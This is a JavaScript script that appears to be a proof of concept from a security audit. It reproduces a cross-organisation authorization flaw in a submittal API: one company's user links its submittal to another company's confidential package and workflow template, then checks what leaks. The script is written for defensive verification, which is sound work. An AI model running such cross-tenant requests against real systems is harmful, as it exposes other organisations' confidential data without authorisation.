'use strict';
/**
 * L8 (D-03) — Submittal packageId / workflowTemplateId link across projects
 * and organisations.
 *
 * Attacker: a PM of company 028 on their own project/submittal.
 * Victim:   company 042 — a submittal package and a workflow template.
 *
 * submittal.service.js upgradeFields :40-41 writes packageId and
 * workflowTemplateId straight from the body with no check; loadSubmittal
 * returns package {id,ref,name,status} and workflowTemplate {id,name,stepsJson}
 * (submittal-workflow.service.js :475-480). The victim package's `submittals`
 * relation (packageInclude :617-618) carries no project filter, so the
 * attacker's foreign submittal is listed — and counted — inside the victim's
 * own package view.
 */
const { as } = require('../lib/api');
const { ATTACKER, VICTIM } = require('./_fib-constants');

const line = (s) => console.log(s);
const show = (label, res) => line(`${label} -> ${res.status} ${JSON.stringify(res.body?.error || res.body?.data?.id || res.body?.data || '').slice(0, 160)}`);

(async () => {
  const atk = as(ATTACKER.pm, ATTACKER.orgId);
  const vic = as(VICTIM.pm, VICTIM.orgId);

  // ── Victim 042 builds its own package and workflow template ──
  const vicPkg = await vic.send('POST', `/projects/${VICTIM.project}/submittals/packages`, { name: 'Olympus confidential package 042' });
  show('VICTIM POST package (042)', vicPkg);
  const victimPackageId = vicPkg.body.data.id;
  const victimPackageRef = vicPkg.body.data.ref;

  const vicTpl = await vic.send('POST', `/projects/${VICTIM.project}/submittals/workflow-templates`, {
    name: 'Olympus confidential review route 042',
    steps: [{ name: 'Secret consultant review', mode: 'sequential', days: 9, assignees: [{ type: 'role', role: 'pm' }] }],
  });
  show('VICTIM POST workflow-template (042)', vicTpl);
  const victimTemplateId = vicTpl.body.data.id;

  // ── Attacker 028 points its own submittal at 042's package + template ──
  const created = await atk.send('POST', `/projects/${ATTACKER.project}/submittals`, { title: 'L8 cross-org package probe' });
  show('ATTACKER POST submittal (028)', created);
  const subId = created.body.data.id;

  const patched = await atk.send('PATCH', `/projects/${ATTACKER.project}/submittals/${subId}`, {
    packageId: victimPackageId,
    workflowTemplateId: victimTemplateId,
  });
  show('ATTACKER PATCH {042 packageId, 042 workflowTemplateId}', patched);

  const got = await atk.send('GET', `/projects/${ATTACKER.project}/submittals/${subId}`);
  const d = got.body.data;
  line(`GET submittal.package = ${JSON.stringify(d.package)}`);
  line(`GET submittal.workflowTemplate = ${JSON.stringify(d.workflowTemplate)}`);

  const linkLeaked =
    patched.status === 200 &&
    d.package?.id === victimPackageId &&
    d.package?.ref === victimPackageRef &&
    d.workflowTemplate?.id === victimTemplateId;

  // ── The attacker's foreign submittal now appears inside 042's own package ──
  const vicView = await vic.send('GET', `/projects/${VICTIM.project}/submittals/packages/${victimPackageId}`);
  const items = vicView.body?.data?.items || [];
  const summary = vicView.body?.data?.summary || {};
  line(`VICTIM GET its package items = ${JSON.stringify(items.map((i) => ({ id: i.id, ref: i.ref, title: i.title })))}`);
  line(`VICTIM GET its package summary = ${JSON.stringify(summary)}`);
  const membershipLeaked = items.some((i) => i.id === subId) || Number(summary.total) > 0;

  // cleanup (attacker side)
  await atk.send('DELETE', `/projects/${ATTACKER.project}/submittals/${subId}`).catch(() => {});

  const defect = linkLeaked || membershipLeaked;
  line('');
  line(`attacker submittal shows 042 package/template detail: ${linkLeaked}`);
  line(`attacker submittal appears inside 042's own package view: ${membershipLeaked}`);
  process.exitCode = defect ? 2 : 0;
  line(
    `VERDICT L8: ${defect ? 'CONFIRMED' : 'NOT_REPRODUCED'} — ${
      defect
        ? "a 028 submittal was linked to a 042 package and workflow template; 028 reads 042's package ref/name, and the foreign submittal is listed and counted inside 042's own package."
        : 'the cross-org packageId/workflowTemplateId were rejected or produced no visible cross-link.'
    }`,
  );
})().catch((e) => {
  console.error('ERROR', e.message);
  process.exitCode = 1;
});
